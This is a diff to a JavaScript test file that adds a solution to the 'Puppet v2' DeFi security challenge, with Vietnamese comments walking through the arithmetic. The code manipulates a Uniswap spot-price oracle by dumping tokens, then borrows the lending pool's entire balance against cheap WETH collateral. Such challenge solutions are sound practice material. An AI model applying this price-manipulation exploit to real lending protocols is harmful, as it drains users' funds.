@@ -82,6 +82,45 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Approve cho Uniswap
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.constants.MaxUint256);
+        /**
+         * Swap từ DVT token ra ETH
+         * Ban đầu mình có 20 ETH và 10000 DVT
+         * Uniswap có 10 WETH và 100 DVT
+         * 10 * 100 / 10000 = 0.1 -> Ta đổi 10000 DVT nhận được 10 - 0.1 = 9.9 ETH
+         * Chúng ta lúc này có 29.9 WETH và 0 DVT
+         * Uniswap lúc này có 0.1 WETH và 10100 DVT
+         * Giá DVT = 3 * UniswapBalanceOfWETH / UniswapBalanceOfDVT
+         * Lượng WETH cần để vay 1 triệu DVT = 1000000 * 3 * 0.1 / 10100 = 29.7 WETH
+         */
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+            1,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+            { gasLimit: 1e6 }
+        );
+        const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // Đổi ETH ra WETH
+        await this.weth.connect(attacker).deposit({value:collateral});
+
+        // console.log("Attacker: ");
+        // console.log((await this.token.balanceOf(attacker.address)).toString()/1e18);
+        // console.log((await this.weth.balanceOf(attacker.address)).toString()/1e18);
+        
+        // console.log("Uniswap: ");
+        // console.log((await this.token.balanceOf(this.uniswapExchange.address)).toString()/1e18);
+        // console.log((await this.weth.balanceOf(this.uniswapExchange.address)).toString()/1e18);
+        
+        await this.weth.connect(attacker).approve(this.lendingPool.address, ethers.constants.MaxInt256);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // console.log("Attacker: ");
+        // console.log((await this.token.balanceOf(attacker.address)).toString()/1e18);
+        // console.log((await this.weth.balanceOf(attacker.address)).toString()/1e18);
+
     });
 
     after(async function () {
